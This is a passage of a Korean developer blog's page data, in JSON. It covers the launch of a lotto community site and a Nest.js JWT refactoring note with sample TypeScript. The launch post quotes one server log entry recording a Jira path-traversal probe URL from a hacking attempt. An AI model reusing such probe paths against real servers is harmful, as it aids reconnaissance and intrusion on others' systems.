사용)](https://elfinlas.github.io/nginx/230330_nginx_header/) 포스팅을 참고하자.\n\n<br>\n\n## 정리\n\n역시 코드를 잘 작성하는 부분이 중요하다.  \n백엔드의 경우 Layer 아키텍쳐에서 포트 앱 어댑으로 바꾸고 나서 정말 코드 보기가 편해졌다.\n\n그리고 리팩토링...  \n개인적으로 리팩토링은 코드를 계속 지속 가능성이 될 수 있도록 해주는 중요한 수단인 것 같다.\n\n배포환경...  \n빨리 찾아서 다행이지...  \n좀만 더 늦었으면 와인 까서 마시면서 엄한 곳이나 쑤셨을 듯 싶다....\n\n```toc\n\n```\n"},{"excerpt":"개발 기간은 길었지만... 드디어 오픈한 흑우집합소 전에 MyMeLink 서비스를 개발한 뒤에 구상한 서비스다. 사실 흑우집합소는 이전에 한번 Spring Boot + Thymeleaf로 만들었던 서비스인데 모바일 환경 미지원에 버그가 정말 많았다... 버그라기 보다는 코드가 정말 똥 그 자체였다. 그래서 이걸 차라리 새로 만들자 라고 해서 만들게 되었다…","fields":{"slug":"/my_project/230329_bcow_start/"},"frontmatter":{"date":"March 29, 2023","title":"로또 커뮤니티 서비스 흑우집합소 오픈하다","description":null,"tags":["MyProject","흑우집합소"],"series":"MHLab Project","previewImage":"strategy-pattern.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](/img01.png)\n\n# 개발 기간은 길었지만...\n\n드디어 오픈한 [흑우집합소](https://bcow.world)\n\n전에 **MyMeLink** 서비스를 개발한 뒤에 구상한 서비스다.  \n사실 흑우집합소는 이전에 한번 **Spring Boot** + **Thymeleaf**로 만들었던 서비스인데 모바일 환경 미지원에 버그가 정말 많았다...\n\n버그라기 보다는 코드가 정말 똥 그 자체였다.  \n그래서 이걸 차라리 새로 만들자 라고 해서 만들게 되었다.\n\n![](/img09.png)\n\n위 화면이 옜날 흑우집합소 버전이다.  \nPC에서는 잘 보이지만 화면이 줄어들면 정말 사용 못할 정도다.\n\n마치 iOS로 말하면 Auto-Layout이 적용 안되어 있는 느낌?\n\n무튼...\n\n기술은 Spring을 쓰려다가 이제는 새로운 기술로 해보고 싶었다.  \n사실 취업 준비할 때는 **Java + Spring**이 거의 정석 빌드 테크였지만,\n\n당시 취업 목표보다는 기술 스택 바꾸고 새로운 걸 배워서 만들어보자 라는 마인드였고,  \n그래서 **MyMeLink**개발 때 사용한 **Typescript**를 사용하여 **Nest.Js** + **Next.JS** 로 만들게 되었다.\n\n인프라는 아마존에 **Nginx** + **LetsEncrypt** 그리고 **MongoDB**, **CloudFlare**의 **R2** 및 **Worker** 등을 사용했다.\n\n<br>\n\n![](/img02.png)\n\n<br>\n\n사실 **[흑우집합소](https://bcow.world)**는 완성된 서비스는 아니다.  \n원래 목표는 **커뮤니티 플랫폼**이었다.\n\n로또의 정보를 교류하고, 당첨 정보, 개인 당첨 이력 등을 공유하는 그런?\n\n그리고 거기에 내가 **로또 전문가에게 받은(?)** 로또 분석법을 녹여서,  \n무료로 로또 번호 조합 제공 및 사용자가 직접 커스텀 해서 만드는 그런 서비스가 목표였다.\n\n하지만 개발 말고 부동산 투자 및 주식 공부, 경제 분야, 미술 학습,  \n내가 좋아하는 와인 생활 등을 하면서 시간을 온전히 쏟지 못했다.  \n그리고 취미생활인 사진 촬영과 더불어 블로깅 등등...\n\n그러다가 빨리 완성을 해야 겠다 라는 생각이 들어서 2월달부터 진도를 좀 빼기 시작했다.  \n그리고 베타 버전이지만 완성을 했다.\n\n## 완벽하진 않다.\n\n사실 이번 프로젝트는 일주일 전에 오픈을 했었다.  \n사이트 홍보는 안하고, 도메인만 밖으로 오픈 시켰다.\n\n각국의 다양한 환영을 받으며(?) 서비스는 잘 돌아갔다.  \n아주 다양한 방법으로 해킹 시도를 하는데 전에 log4j 보안 취약점으로 오기도 하고, 아래 로그처럼 이상한 경로로 잘 타고 들어오려 한다.\n\n```\n{\n    \"_id\": {\"$oid\": \"629439d94cedfd000131d0a6\"},\n    \"accessCountryCode\": \"US\",\n    \"accessUrl\": \"/s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties\",\n    \"createDate\": {\"$date\": \"2023-03-24T12:28:25.994Z\"},\n    \"httpMethod\": \"GET\",\n    \"msg\": \"{\\\"profile\\\":\\\"real-master\\\"}\"\n  },\n  {\n    \"_id\": {\"$oid\": \"629439da4cedfd000131d0a7\"},\n    \"accessCountryCode\": \"US\",\n    \"accessUrl\": \"/\",\n    \"createDate\": {\"$date\": \"2023-03-24T12:28:26.003Z\"},\n    \"httpMethod\": \"GET\",\n    \"msg\": \"{\\\"profile\\\":\\\"real-master\\\"}\"\n  },\n```\n\n참고로 접근 기록을 Mongo에 담으려다가 이제는 방식을 좀 바꿨다.  \n자세한 개발 내역은 **TIL**에서 다룰 예정이다.\n\n정말... 지금 노션에 쌓여있는 개발 기록을 블로깅화 해야 하는데 이것도 만만치 않을 듯 싶다...\n\n![](/img08.png)\n\n<br>\n\n저기에 말고도 더 있다는 게 함정...\n\n무튼 서비스에 게시판도 달고, 자칭 로또 전문가에게 받은 분석 기법을 사이트에 다 녹여내지 못했다.  \n그래도 다행인 건 추천 번호 서비스에는 어느정도 기법을 녹여내서 다행이라(?) 생각이 든다.\n\n모든 IT 서비스가 그렇겠지만...  \n**처음부터 완벽할 수 없고, 완벽하게 출시할 수 없다.**\n\n물론 다 그런건 아니겠지만, 팀이 아닌 순수하게 개인 혼자서 만들어 낸 프로젝트는 미흡할 수 밖에 없다.  \n하지만 미흡해도 하나씩 붙여서 완성해 나가면 된다.\n\n내가 예전에 롤을 좋아했는데 거기 리븐이라는 케릭터가 이런 대사를 한다.  \n**부러진 건 다시 붙이면 돼.**\n\n프로젝트를 출시했을 땐 어떻게 해서든 이어 붙여서 형태를 유지한 채 출시할 것이다.\n\n<br>\n\n![](/img05.png)\n\n<br>\n\n근데 점점 하나씩 완성해 나가면서 저 금간 부분을 잘 붙여서 완성시켜 나가면 된다.  \n(라고 난 생각한다 -\\_-;;;)\n\n## 근데 로또 서비스는 생성 번호를 만들어주는건 간단할 거 같은데?\n\n맞는 말이다.  \n그냥 1~45 랜덤으로 번호를 주는 방식으로 해주면 말이다.\n\n사실 작은 썰을 풀면 내가 아주 옛날에 작은 스타텁을 다닐 때 만난 인연이 있다.  \n자칭 로또 전문가인 이 기획자분은 로또 2등이 3번되고 3등도 몇번 되었다고 자랑했다.\n\n당첨 용지를 보니까 진짜 분석이 되나 싶기도 하고...(그렇게 미끼를 문건가...)\n\n그러다 이 양반이랑 술한잔 하면서 기법을 전수해줬고, (술자리에서 엑셀을 보고 사실 미친놈이라 생각했다....)  \n그 뒤부터 나도 간단하게 안드로이드 앱으로 개발하면서 로또를 취미로 아주 작은 금액으로 사기 시작했다.\n\n그 양반은 2013년부터 5년동안(아마 지금까지 매주 살듯...)  \n매주 빠짐없이 사는걸 보고 참 대단하다 싶었다.  \n안드로이드로 시작한게 아마 20년도쯔음 이었을거다.\n\n구매는 보통 5천 ~ 1만원 사이?  \n아주 아주 가끔 필 받으면 최대 2만원?\n\n그 이상은 돈이 아까웠다.  \n(로또 매주 5~10만원씩 살 돈으로 와인을 사먹는게...)\n\n그리고 그 양반 기법이 맞나 싶기도 하면서도 아닌가 싶기도 한게...\n\n4등이랑 5등은 자주 되었고,  \n3등 2번이 되긴 했다.  \n물론 자동이 아닌 수동으로 말이다.\n\n인증이 없으면 신뢰 0%이기에...\n\n![](/img06.png)\n\n내 개인 블로그에도 올렸는데 그거 그대로 가져왔다.  \n용지도 그때 찍어둔게...\n\n|                 |                 |\n| --------------- | --------------- |\n| ![](/img03.png) | ![](/img04.png) |\n\n사진은 개인정보 및 구매 정보가 노출될 부분이 있어서 지웠다.  \n하지만 원본은 내 당첨 사실 증명을 위해 iCloud 안에...\n\n참고로 3등 이상 당첨은 은행가서 받는데 용지를 안돌려준다.  \n이건 지점마다 틀린거 같긴 한데 난 두 지점 다른데 가봤는데 다 안줬다 -\\_-;;\n\n무튼...  \n그렇게 하다가 그 양반의 부탁으로 이걸 웹 서비스로 만들게 되었고,  \n초창기 버전이 나와서 오픈은 제대로 못하고 그 양반이랑 몇몇 사람들만 쓰는 폐쇄적 서비스로 오픈했다.\n\n이후 다시 이걸 제대로 만들어서 이번에 오픈을 했다.\n\n근데 내가 로또는 항상 그 전문가 양반하고 이야기 하지만...  \n로또는 운으로 하는 일종의 운빨게임이다.  \n분석이라는거 자체가 무의미하다고 보면 된다.\n\n하지만 그 양반 왈...  \n**자신의 분석 기법으로 좀 추리면 불가능한 수를 제외할 때 당첨확률은 올라가지 않을까?**  \n(솔직히 될놈 될 아닐까?)\n\n뭐 로또는 그냥 개인 생각에 맡기지만...  \n그냥 **운으로** 하는게 좋다.\n\n오죽하면 나도 내 블로그에 추천 번호 쓰면서 아래와 같은 맨트를 달아둔다.\n\n![](/img07.png)\n\n## 근데 기술적인 부분은?\n\n기술 블로그인데 너무 사설이 길었다.  \n뭐 여기서 자세하게 쓰기엔 양이 방대해서 TIL에 조금씩 녹여서 써보고...\n\n그리고 슬슬 개발자로 일해보기 위해 포트폴리오 용으로 쓸 겸 가볍게 정리해본다.\n\n### 개발 언어\n\n당시 새로운 기술을 쓰기 전에 언어를 정해보려 했다.  \n또 자바 스프링을 쓰자니... 대기업 취업용도 아니고...\n\n이제는 새로운거...특히 당시 React가 엄청 활발해지고(물론 전에도 그랬지만 -\\_-;;)  \nJavascript 하나를 쓰면 백엔드(Node.Js)와 프론트엔드(React)를 쓸 수 있어서 Javscript를 선택했다.\n\n근데 당시 마지막 스타텁 다닌 회사에 지인이...(어찌보면 이쪽 기술을 쓸 수 있게 잘 알려준 고마운 인연이다.)  \n한번 써보라고 하고, 이것저것 많이 알려주고 셋팅도 도와줬다.\n\n원래 같이 미니 프로젝트도 Javascript 배울 겸 했는데 그건 중간에 내가 나왔다.\n\n무튼...Javascript 쓰다가 Typescript를 추천해줬고, 난 원래부터 Type이 강한 언어를 좋아해서,  \n**Typescript를 주 언어로 쓰게 되었다.**\n\n여담인데 난 밥벌이 및 용돈벌이를 iOS로 대학생 때 시작했는데 당시 **Objective-C**로 개발을 했다.  \n이거 써본 사람은 알 것이다.  \n형 지정도 강하고, 메모리 관리까지...\n\n무튼 그 뒤로 Java만 쭉 썼고...  \n그래서 그런지 일부 개발자들이 Javascript의 편리함에서 딱딱한 Typescript를 받아들이기 어려웠다는데...\n\n난 정 반대였다.  \n프리한 Javascript가 좀 이질적이고 이상하고, 다른 의미로 어려웠다.\n\n### 백엔드 (Back-End)\n\n**Nest.JS**를 사용했다.  \n왜 사용했냐...\n\n이거 써보면 알겠지만 거의 Spring 판박이다.  \nAOP나 스프링의 각종 철학과 페러다임이 잘 녹아있다.\n\n심지어 스프링의 어노테이션 문법을 Nest 진영에서는 데코레이터라고 해서 쓴다.  \n둘이 완전 같은건 아닌데 유사하다.  \n물론 파이썬에도 데코레이터가 있지만...일단 논외로...\n\n난 Node.js는 예제만 돌려봤지 이거를 제대로 써본적은 없다.  \n그래서 배포할 때 PM2 이런것도 배워가며 썼다.\n\n무튼 Nest.Js는 크게 어려운 것 없이 잘 적응해서 [흑우집합소](https://bcow.world)의 뒷단을 맡는 프레임워크로 사용 중이다.\n\n### 프론트엔드 (Front-End)\n\n**Next.Js**를 사용했다.\n\n웃긴건...\n난 리엑트(React)도 안써봤다.  \n그래서 노마드코더에서 하는 무료강의랑 유튜브 미쿸 인도 성님들꺼 강의 몇개 들은게 끝이다.\n\n그리고 그 뒤에 Next.Js라는게 있다 해서 써보니 React의 일부 설정을 자동으로 편하게 해줬다.  \n시간이 부족했던 나는 일단 **마법(?)**을 부리는 Next.Js를 선택했다.\n\n물론 개발이 어느정도 끝나면 조금씩 기본기를 올리면 된다는 마인드로...\n\n시범 빠따용으로 [MyMe.Link](https://myme.link)를 통해서 약간 감을 익혔다.\n이때 많이 고생했다.\n\n맨땅 헤딩하는게 오랜만에 겪으니 참 불쾌했지만 뭐 어쩔수 있나...\n\n무튼 Next.Js를 쓰니 정말 라우팅 설정부터 해서 특히 미들웨어 성향을 가지는 **Api Route**기능은 매우 유용했다.\n\n프론트엔드라는 영역은 처음 해보는데 나름 재미있었다.  \n프론트로 취업도 생각해봤지만...  \n경력직 인정이 안되서... OTL\n\n컴포넌트 나누기, 도메인 정하기, SSR 등 프론트 고민을 위해 원티드의 챌린지를 매월 듣는 중이다.\n\n그리고 **TailwindCss**를 사용한다.  \nCSS 프레임워크로 원래 관심이 있었고, 부트스트랩이나 아주 예전에 쓰던 **Semantic-UI**도 다시 써볼까 했지만...  \n그냥 TailwindCss 쓰길 잘한것 같다.\n\n### 데이터베이스 (MongoDB)\n\nMongoDB를 선택한 건 나쁜 선택은 아니었던 것 같다.  \nRDB를 쓰면 데이터가 딱 스키마에 들어가게끔 짜야 하는데, 로또 생성 규칙이나 분석법 등은 Json 형태로 저장해야 했다.\n\n로또 판매 데이터나 로또 회차 정보와 같은 복권사에서 제공하는 데이터는 모두 정형화 되어 있다.  \n하지만 엑셀 분석 데이터나 공식, 그리고 생성 규칙 등은 좀 유동적이고 비정형이 많다.\n\n그래서 MongoDB를 선택했다.\n\n일부 데이터는 RDB로 옮길까 했지만 일단 그건 서비스가 잘 되서 안정성을 높일 때 선택할 옵션인 것 같다.\n\n### 인프라 (Infra)\n\n기본은 AWS의 EC2 무료 플랜으로 시작했다.  \n잘 되면 그때는 머니파워로...\n\n도메인은 어딘가에서 구입했고, Route53으로 연결했다.  \nHTTPS를 위해서 LetsEncrypt를 사용했다.  \n그리고 Http => Htts 프록시 및 기타 서비스 관리를 위해 nginx를 사용했다.\n\n파일 업로드를 위해서는...  \n현재는 빈약하지만... 개인 정보에서 프로필 이미지 쪽을 위해서 CloudFlare의 R2를 사용했다.  \n아마존 S3를 쓸까 했지만 데이터 트랜스 피가 있고, 새로운 것을 한번 써보자는 마인드로 써봤다.\n\n이와 관련해서는 2개의 포스팅을 남겼다.  \n궁금하신 분은 [CloudFlare R2 사용해보기 Part 1 (With Nest.Js)](https://elfinlas.github.io/cloud-flare/230127_use_r2/)  \n[CloudFlare R2 사용해보기 Part 2 (With Nest.Js)](https://elfinlas.github.io/nest_js/230203_r2_nestjs/)\n\n포스팅을 참고하자.\n\n## 너무 길었다. 정리 요약\n\n이번 프로젝트를 하면서 어렵다기 보다는 뭔가 귀찮은게 많았다.  \n개발자의 삶을 다시 살면 재미있을 것 같아서 시작한 것인데 후회하진 않는다.\n\n이 [흑우집합소](https://bcow.world)는 혼자서 기획, 디자인, 개발(백,프론트,인프라)을 맡아서 한 프로젝트다.  \n물론 주요 핵심인 분석 자료는 그 양반이 준 거지만...  \n이제는 분석 자료를 나에게 다 양도한다 해서 뭐 나혼자 했다 해도 무방할듯 싶다. ㅎㅎ\n\n진짜 OpenAI를 잘 썼다.  \nOpenAI 덕분에 일부 반복적인 코드나 간단한 로직은 맡겨서 수월했다.\n\n하지만 Port & Adaptor 아키텍쳐 적용이나, 내가 가진 공식을 코드화 시키는건 불가능했기에,  \n이 부분은 내 영역이었다.\n\n사실 이제부터 시작인듯 싶다.  \n아직 미구현 기능도 많고, 약간 UI 버그 및 코드 리팩토링도 많이 남아있다.\n\n오늘은 Github에 각종 이슈 및 해야 할 일을 정리하고...  \n간만에 밀린 블로그 글이나 남겨봐야겠다.\n\n혹시 로또하시는 분은 [흑우집합소](https://bcow.world)도 이용해주시면 감사하겠다.  \n로또 관련된 흑우집합소 포스팅은 [개인 취미 블로그](https://blog.naver.com/wisseraph)에서 이어갈 예정이다.\n\n나는 1등은 안되었지만...  \n이 글을 읽고 어느 누군가가 흑우집합소에서 나온 번호로 1등이 되시길 기원하며...\n\n![](/img10.jpeg)\n\nPS : 클로즈 베타 때 로그에 3등이 나왔었는데 지인이 그 번호를 안썼다고...\n\n```toc\n\n```\n"},{"excerpt":"23년 2월 13일 TIL 금일 흑우집합소를 개발하며 배운 내용 및 겪은 과정을 정리하여 올려본다. 오늘은 깔끔한 코드 작성에 대해 고민한 부분을 정리하여 올려본다. 어제 작업하던 JWT 부분에 대해 매듭을 지려고 했다. 일부분은 Ports And Adapters Architecture 방식으로 작성해보려고 노력중이다. 근데 확실히 레이어드 아키텍쳐보다 …","fields":{"slug":"/til/230214_til/"},"frontmatter":{"date":"February 14, 2023","title":"23년 2월 14일 TIL & 개발노트 (깔끔한 코드에 대한 고민)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 23년 2월 13일 TIL\n\n금일 흑우집합소를 개발하며 배운 내용 및 겪은 과정을 정리하여 올려본다.  \n오늘은 깔끔한 코드 작성에 대해 고민한 부분을 정리하여 올려본다.\n\n어제 작업하던 JWT 부분에 대해 매듭을 지려고 했다.  \n일부분은 **Ports And Adapters Architecture** 방식으로 작성해보려고 노력중이다.\n\n근데 확실히 레이어드 아키텍쳐보다 더 나은 것 같다.  \n이유는 크게 세 가지다.\n\n1. 하나의 코드 파일의 가독성 증가\n2. 레이어드 보다 더 세분화 가능\n3. 깔끔한 파일 관리\n\n개인적 사견이 많이 녹여 있어서 다른 사람은 공감 못할 수 있다.  \n레이어드 아키텍쳐로도 충분히 구현 가능하지만, 이 아키텍쳐로 인해 명확하게 각 역할이 나눠지는 것을 채감했다.\n\n이것은 차후에 다루고...  \n오늘 했던 고민은 아래와 같다.\n\n<br>\n\n## 고민 포인트\n\n먼저 내가 jwt를 검증하는 Inbound 영역의 서비스 로직이 있다.  \n코드는 아래와 같다.\n\n```typescript\nexport class VerifyJwtService implements VerifyJwtOutboundPort {\n  constructor(\n    private readonly jwtService: JwtService,\n    @Inject(DECODE_JWT_OUTBOUND_PORT)\n    private readonly decodJwtOutboundPort: DecodeJwtOutboundPort,\n    @Inject(FIND_ACCOUNT_EMAIL_JOIN_TYPE_OUTBOUND_PORT)\n    private readonly findAccountEmailJoinTypeOutboundPort: FindAccountEmainJoinTypeOutboundPort,\n    @Inject(LOGOUT_ACCOUNT_INBOUND_PORT)\n    private readonly logoutAccountInboundPort: LogoutAccountInboundPort,\n    @Inject(CREATE_JWT_OUTBOUND_PORT)\n    private readonly createJwtOutboundPort: CreateJwtOutboundPort\n  ) {}\n\n  async excute(params: VerifyJwtInputDto) {\n    try {\n      params.tokenType === JWT_TYPE.ACCESS_TOKEN\n        ? await this.verifyAccessJwt(params.jwt)\n        : await this.verifyRefreshJwt(params.jwt)\n    } catch (e) {\n      throw e\n    }\n  }\n\n  private async verifyAccessJwt(jwt: string) {\n    try {\n      this.jwtService.verify(jwt, {\n        secret: process.env.JWT_ACCESS_SECRET_KEY,\n        audience: getJwtAudience(),\n        issuer: getJwtIssuer(JWT_TYPE.ACCESS_TOKEN),\n      } as JwtVerifyOptions)\n    } catch (e) {\n      const validResult = this.tokenExceptionHandler(\n        e,\n        jwt,\n        JWT_TYPE.ACCESS_TOKEN\n      )\n\n      if (validResult instanceof AuthException) {\n        throw validResult\n      }\n\n      //고민 포인트 01\n      //액세스 토큰에서 만료가 되면 리프래시 토큰을 검증한다.\n      //큰 문제 없다면 AccessToken을 다시 전달한다.\n      //이 부분에는 거의 10~20줄 짜리 코드 로직이 들어갔었다.\n    }\n  }\n\n  /**\n   * 리프레시 토큰 검증  고민포인트 02\n   * @param jwt\n   */\n  private async verifyRefreshJwt(jwt: string) {\n    try {\n      this.jwtService.verify(jwt, {\n        secret: process.env.JWT_REFRESH_SECRET_KEY,\n        audience: getJwtAudience(),\n        issuer: getJwtIssuer(JWT_TYPE.REFRESH_TOKEN),\n      } as JwtVerifyOptions)\n    } catch (e) {\n      //고민 포인트 03\n      //리프레시 만료시에 대한 처리 로직\n    }\n  }\n\n  /**\n   * 토큰 예외 공통 처리 핸들러\n   * @param e\n   * @param jwt\n   * @param tokenType\n   * @returns\n   */\n  private tokenExceptionHandler(\n    e: Error,\n    jwt: string,\n    tokenType: JwtType\n  ): boolean | AuthException {\n    //토큰 만료 시\n    if (e instanceof TokenExpiredError) {\n      console.log(\"[tokenExceptionHandler] : TokenExpiredError\")\n      // return true;\n      return new AuthException(AuthJwtErrorCode.jwtExpired(jwt, tokenType))\n    }\n    // payload가 잘 못 되었을 때 (base64 decode가 안되는 경우 등)\n    else if (e instanceof SyntaxError) {\n      console.log(\"[tokenExceptionHandler] : Syntax\")\n      // throw new AuthException(AuthJwtErrorCode.jwtInvalid(jwt, tokenType));\n      return new AuthException(AuthJwtErrorCode.jwtInvalid(jwt, tokenType))\n    }\n\n    // JwtWebTokenError should be later than TokenExpiredError\n    //보통 토큰의 시크릿 코드가 변경되었는데 구형 키 값을 사용하여 만들어진 JWT를 사용할 경우 발생\n    else if (e instanceof JsonWebTokenError) {\n      console.log(\"[tokenExceptionHandler] : JsonWebTokenError\")\n      // throw new AuthException(AuthJwtErrorCode.invalidTokenOrInvalidSignature(jwt));\n      return new AuthException(\n        AuthJwtErrorCode.invalidTokenOrInvalidSignature(jwt, tokenType)\n      )\n    }\n\n    //그 외 기타 에러\n    //기타 에러\n    return new AuthException(AuthJwtErrorCode.jwtEtcError(jwt, tokenType))\n  }\n}\n```\n\n딱 봐도 코드의 문제가 보인다. (고민 포인트는 아래서 집어볼 예정)  \n일단 가장 큰 문제는 코드의 복잡도가 높다는 것이다.\n\n내가 최근 연습하고 있는 방법은 **하나의 서비스는 하나의 기능만 담당한다** 이다.  \n이게 생각보다 어렵다.\n\n명확하게 나눠지는건 쉽게 자를 수 있지만 위처럼 Jwt를 구현할 때 Access와 Refresh를 같이 쓴다.  \n이 경우 아래와 같이 생각할 수 있다.\n\n<br>\n\n1. 먼저 한 메서드를 통해 JWT와 타입을 받고 내부 프라이빗 메서드에서 나눠서 처리하는 방법\n2. 검증 자체 목적에 집중하는 서비스 로직과 Access와 Refresh 각각을 담당하는 서비스로 나눠서 처리하는 방법\n3. 검증이라는 목적에 집중하여 Access와 Refresh 검증만 하고 그 외 예외 발생 시 호출 영역으로 전가시키기\n\n<br>\n\n맨 처음 내가 구현한 방법은 1번 방식이었고...  \n결국 위 코드처럼 복잡도가 매우 많이 상승하게 되었다.\n\n그럼 2번으로 할 것인가...  \n이 부분도 잘 생각해야 하는게 나누고 자르는게 좋지만 너무 나눌 경우 그것 자체로 인해 기능이 너무 산재되어 결국 코드 팔로우가 힘들 것이다.\n\n그래서 3번의 방법을 선택하게 되었다.  \n이렇게 하면서 각 고민 포인트를 고민하고 해결하였다.\n\n<br>\n\n### 고민 포인트 01\n\nAccess JWT를 검증하고 catch 하는 부분에서 예외에 대하여 직접 처리하려 했더니 catct 부분이 복잡해졌다.  \n이로 인해 Refresh JWT 부분의 catch도 같은 문제가 생기게 되었다.\n\n이 부분은 위에서 언급한 3번 방법으로 해결하게 되었다.\n\nJWT를 검증하는 로직에서 **AuthException** 이라는 예외를 직접 핸들링하고,  \n이 부분에서 내가 의도한 예외(Access의 Expired 같은)는 따로 정상 처리를 하고,  \n그 외의 예외는 호출 지점으로 올려서 Controller 단의 **ExceptionHandler**로 흐르게끔 처리했다.\n\n그래서 이 부분은 해결할 수 있었다.\n\n<br>\n\n### 고민 포인트 02\n\n검증 로직에서 Access 와 Refresh를 각각 나눠서 별도의 파일로 관리할 것인가를 고민했었다.  \n근데 이것도 위에서 언급한 바와 같이 정답이 아니었다.\n\n혹시 별도의 JWT가 추가되면 계속 코드 파일이 늘어나기 때문이다.  \n그래서 이 부분은 1번 포인트와 같이 검증 목적에 집중하기로 했다.\n\n결국 신경 쓸 부분은 Refresh가 만료된 시점에 사용자 로그아웃 처리였다.  \n이 부분은 검증 로직에서 신경 쓸 것이 아닌 호출 지점에서 처리할 문제였다.\n\n<br>\n\n```typescript\n@Injectable()\nexport class AccessJwtStrategy extends PassportStrategy(Strategy, \"jwt\") {\n  constructor(\n    @Inject(VERIFY_JWT_OUTBOUND_PORT)\n    private readonly verifyjwtOutboundPort: VerifyJwtOutboundPort,\n    @Inject(DECODE_JWT_OUTBOUND_PORT)\n    private readonly decodJwtOutboundPort: DecodeJwtOutboundPort,\n    @Inject(CREATE_JWT_OUTBOUND_PORT)\n    private readonly createJwtOutboundPort: CreateJwtOutboundPort,\n    @Inject(FIND_ACCOUNT_EMAIL_JOIN_TYPE_OUTBOUND_PORT)\n    private readonly findAccountEmailJoinTypeOutboundPort: FindAccountEmainJoinTypeOutboundPort,\n    @Inject(LOGOUT_ACCOUNT_INBOUND_PORT)\n    private readonly logoutAccountInboundPort: LogoutAccountInboundPort\n  ) {\n    super()\n  }\n\n  async validate(req: Request, payload: any) {\n    const jwt = req.header(\"testAuth\")\n\n    if (!jwt) {\n      throw new AuthException(AuthJwtErrorCode.jwtNotFound())\n    }\n\n    try {\n      await this.verifyjwtOutboundPort.excute({\n        jwt,\n        tokenType: JWT_TYPE.ACCESS_TOKEN,\n      })\n    } catch (e) {\n      if (e instanceof AuthException) {\n        //Access Jwt 만료된 경우\n        if (e.errorCode === ERROR_CODE_JWT_EXPIRED) {\n          const validResult: boolean = await this.validRefreshJwt(account)\n          //이후 로직 처리\n        }\n      } else {\n        throw e\n      }\n    }\n    return payload\n  }\n}\n```\n\n위 코드는 **Strategy** 파일이다.  \nNest.js에서 사용하는 전략 파일의 일종이고, 이건 Access Jwt의 처리를 담당하는 Strategy다.\n\n이 부분에서 토큰 검증 이후 만료된 토큰에 대한 처리, 갱신 가능하면 갱신 처리, 각종 Jwt의 예외처리를 담당했다.  \n위 코드는 샘플용이라 정확하지 않지만...\n\n내가 지금 확인해보니 이 Strategy는 import와 몇 주석을 빼면 100줄도 안되는 코드로 변했다.  \n기존에 verify에 몰아서 짤 때는 약 300줄이 넘어갔다 -\\_-;;\n\n그래서 **목적에 집중한 코드** 덕분에 한결 나아진 코드를 작성할 수 있었다.\n\n<br>\n\n### 고민 포인트 03\n\n이 부분도 01, 02와 연계되어 있는데, 결국 Refresh가 만료되었을 때에 대한 처리 빼곤 Access와 동일했다.  \n그래서 별도 분리를 하지 않고, verify에서 예외를 호출단으로 넘기고 처리는 호출점에서 담당하는 방식으로 해결했다.\n\n<br>\n\n## 정리\n\n오늘도 코드를 작성하면서 좀 더 깔끔하고, 유지보수가 쉬운 코드로 작성하는 연습을 하면서 하니...  \n사실 시간은 좀 배로 걸리는 것 같다.\n\n실행 목적에 집중하여 막 짜면 결과는 사실 금방 나온다.  \n그리고 이렇게 블로그로 남길거 생각 안하면 더 빠르고...\n\n근데 이렇게 하여 완성하고 나면 결국 그 뒤가 문제다.  \n지금 내가 만든 **MyMe.Link**가 그렇다.\n\n정말 코드가 판타스틱하다.  \n사실 유지보수 해야 하는데 정말 큰 일이 된거 같아서 큰일이다...  \n차라리 다시 짜는게 나을 것 같기도 할 정도니 말이다.\n\n이번 흑우집합소는 그런 전철을 안밟게 하려고 하는데 이게 맞는건지도 사실 잘 모르겠다.  \n정답은 없기에...\n\n일단 이게 최선의 방법인 것 같고 하면서 더 나은 코드를 짜는 방법을 찾는게 목적이 되었다.\n\n중간에 개발업 내려놨다 왔지만 나름 5년차 백엔드 개발자다.  \n물론 약 3년 휴식 + 전에 약간 섞인 물경력이 문제긴 하지만...\n\n나름 쌓여있는 경험치 덕분에 혼자서도 이렇게 잘(?) 해낼 수 있던 것 같다.\n\n이제는 다른 사람과 함께 일해보고 싶다.  \n근데 일단 매듭은 짓고 다시...\n\n```toc\n\n```\n"},{"excerpt":"23년 2월 13일 TIL & 개발노트 (흑우집합소) 금일 흑우집합소를 개발하며 배운 내용 및 겪은 과정을 정리하여 올려본다. 오늘은 JWT 인증 부분을 처리하였다. Nest.js에서 JWT 사용시 Error 커스텀 처리 Passport-JWT를 그대로 사용하려 했는데 Access Jwt의 토큰 만료시에도 401을 띄운다. 나는 Access Token에 …","fields":{"slug":"/til/230119_til/"},"frontmatter":{"date":"February 13, 2023","title":"23년 2월 13일 TIL & 개발노트 (흑우집합소)","description":null,"tags":["TIL","흑우집합소"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 23년 2월 13일 TIL & 개발노트 (흑우집합소)\n\n금일 흑우집합소를 개발하며 배운 내용 및 겪은 과정을 정리하여 올려본다.\n\n오늘은 JWT 인증 부분을 처리하였다.\n\n## Nest.js에서 JWT 사용시 Error 커스텀 처리\n\n- Passport-JWT를 그대로 사용하려 했는데 Access Jwt의 토큰 만료시에도 401을 띄운다.\n- 나는 Access Token에 대해서는 토큰 만료 시 서버 내에서 저장된 리프레시 토큰을 확인하고 그에 따른 추가 작업을 하기 원했다.\n- 물론 try catch로 처리할 수 있지만 이렇게 하면 **AuthExceptionHandler**처리 부분이 너무 지저분해진다.\n- 그래서 좀 찾아본 결과 **passport-custom**이란 것으로 **Strategy**부터 커스텀 처리를 할 수 있는 것을 찾았다.(이건 따로 포스팅 예정)\n- 패키지를 설치하고 적용해봤다.\n- 일일히 JWT에 대한 에러를 핸들링 해야 하는 부분이 있지만 직접 핸들링을 할 수 있어서 더 좋은 것 같다.\n\n```typescript\nimport { Inject, Injectable } from \"@nestjs/common\"\nimport { PassportStrategy } from \"@nestjs/passport\"\nimport { Request } from \"express\"\nimport { Strategy } from \"passport-custom\"\nimport { AuthException } from \"../exceptions/auth.exception\"\nimport { AuthJwtErrorCode } from \"../exceptions/auth.jwt.error.code\"\nimport {\n  VerifyJwtOutboundPort,\n  VERIFY_JWT_OUTBOUND_PORT,\n} from \"../ports/out/jwt/verify.jwt.outbound.port\"\nimport { JWT_TYPE } from \"../types/jwt.enums\"\n\n@Injectable()\nexport class AccessJwtStrategy extends PassportStrategy(Strategy, \"jwt\") {\n  constructor(\n    @Inject(VERIFY_JWT_OUTBOUND_PORT)\n    private readonly verifyjwtOutboundPort: 